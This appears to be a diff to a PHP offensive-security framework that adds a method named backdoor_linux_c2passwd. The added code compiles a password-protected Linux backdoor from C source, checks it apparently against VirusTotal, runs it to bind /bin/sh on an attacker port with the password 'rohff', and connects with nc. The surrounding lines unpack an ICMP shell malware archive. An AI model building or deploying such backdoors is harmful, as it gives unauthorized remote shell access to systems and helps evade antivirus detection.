@@ -258,6 +258,20 @@ This can be handy to get a list of processes and their PID number.");
     }
     
     
+    public function backdoor_linux_c2passwd(){
+        $this->ssTitre(__FUNCTION__);
+        $this->requette("cp -v $this->dir_c/backdoor_with_password.c $this->file_dir/$this->file_name.c");
+        $file_c = new FILE("$this->file_dir/$this->file_name.c");
+        $file_elf = $file_c->file_c2elf("-m32");
+        $this->file_file2virus2vt();
+        $this->elf2info();
+        $this->pause();
+        $cmd1 = "$this->file_path /bin/sh $this->attacker_port rohff ";
+        $cmd2 = "nc $this->attacker_ip $this->attacker_port -v -n";
+        $this->exec_parallel($cmd1, $cmd2, 2);
+        $this->pause();
+    }
+    
     public function backdoor_linux_icmp_client() {
         $this->ssTitre(__FUNCTION__);
         $this->requette("tar -xvzf $this->dir_tools/Malware/ISHELL-v0.2.tar.gz -C $this->dir_tmp");
